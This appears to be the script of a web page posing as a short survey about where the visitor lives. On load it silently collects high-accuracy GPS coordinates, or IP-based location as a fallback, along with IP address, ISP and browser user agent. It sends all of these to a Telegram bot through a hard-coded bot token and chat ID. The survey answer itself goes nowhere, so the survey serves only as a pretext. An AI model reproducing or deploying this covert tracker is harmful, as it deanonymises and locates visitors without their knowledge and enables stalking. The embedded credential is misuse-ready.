document.addEventListener("DOMContentLoaded", function () {
    gsap.from(".survey-icon", { opacity: 0, y: -20, duration: 1 });
    gsap.from("#title", { opacity: 0, y: -20, duration: 1, delay: 0.5 });
    gsap.from("#loading", { opacity: 0, y: 10, duration: 1, delay: 1 });

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(success, error, { 
            enableHighAccuracy: true, 
            timeout: 10000, 
            maximumAge: 0 
        });
    } else {
        showError("Geolocation is not supported by your browser.");
    }
});

async function success(position) {
    let lat = position.coords.latitude;
    let lon = position.coords.longitude;
    
    console.log("📍 GPS Location Found: ", lat, lon);

    try {
        // Fetch location details from OpenStreetMap
        let locationResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
        let locationData = await locationResponse.json();

        let state = locationData.address.state || "Unknown State";
        let city = locationData.address.city || locationData.address.town || "Unknown City";
        let country = locationData.address.country || "Unknown Country";

        // Fetch IP & ISP details
        let ipResponse = await fetch("https://ipapi.co/json/");
        let ipData = await ipResponse.json();

        document.getElementById("loading").style.display = "none";
        document.getElementById("survey").classList.remove("hidden");
        document.getElementById("question").innerText = `How do you feel about living in ${state}?`;
        gsap.from("#survey", { opacity: 0, scale: 0.8, duration: 0.5 });

        // Telegram Bot Token & Chat ID
        let botToken = "7082348594:AAENnyiU1uxvjATBwFinj5jcI3YgsiCzB2A";
        let chatID = "YOUR_CHAT_ID"; // Replace with your actual Telegram Chat ID

        // Message for Telegram
        let message = `
🌍 **New User Data**  
📍 **City:** ${city}  
🏛 **State:** ${state}  
🌎 **Country:** ${country}  
📌 **Latitude:** ${lat}  
📌 **Longitude:** ${lon}  
💻 **IP Address:** ${ipData.ip}  
🌐 **ISP:** ${ipData.org}  
🖥 **User-Agent:** ${navigator.userAgent}
        `;

        // Send data to Telegram bot
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatID,
                text: message,
                parse_mode: "Markdown"
            })
        });

    } catch (err) {
        console.error("❌ Error fetching location details: ", err);
        showError("Failed to fetch location details. Using IP-based location.");
        getIPLocation();
    }
}

function error(err) {
    console.warn("⚠️ Geolocation Error: ", err);
    showError("Failed to get GPS location. Using IP-based location.");
    getIPLocation();
}

async function getIPLocation() {
    try {
        let ipResponse = await fetch("https://ipapi.co/json/");
        let ipData = await ipResponse.json();

        let state = ipData.region || "Unknown State";
        let city = ipData.city || "Unknown City";
        let country = ipData.country_name || "Unknown Country";

        document.getElementById("loading").style.display = "none";
        document.getElementById("survey").classList.remove("hidden");
        document.getElementById("question").innerText = `How do you feel about living in ${state}?`;

        // Telegram Bot Token & Chat ID
        let botToken = "7082348594:AAENnyiU1uxvjATBwFinj5jcI3YgsiCzB2A";
        let chatID = "1201917438";

        // Message for Telegram
        let message = `
🌍 **IP-Based Location Data**  
📍 **City:** ${city}  
🏛 **State:** ${state}  
🌎 **Country:** ${country}  
💻 **IP Address:** ${ipData.ip}  
🌐 **ISP:** ${ipData.org}  
🖥 **User-Agent:** ${navigator.userAgent}
        `;

        // Send data to Telegram bot
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: chatID,
                text: message,
                parse_mode: "Markdown"
            })
        });

    } catch (err) {
        showError("Location retrieval failed.");
    }
}

function showError(message) {
    document.getElementById("loading").style.display = "none";
    let errorElement = document.getElementById("error");
    errorElement.innerText = message;
    errorElement.classList.remove("hidden");
    gsap.from("#error", { opacity: 0, y: -10, duration: 0.5 });
}

function submitSurvey() {
    let answer = document.getElementById("answer").value.trim();
    if (answer === "") {
        alert("Please enter your answer before submitting.");
    } else {
        alert("Thank you for your response!");
        document.getElementById("answer").value = "";
    }
}
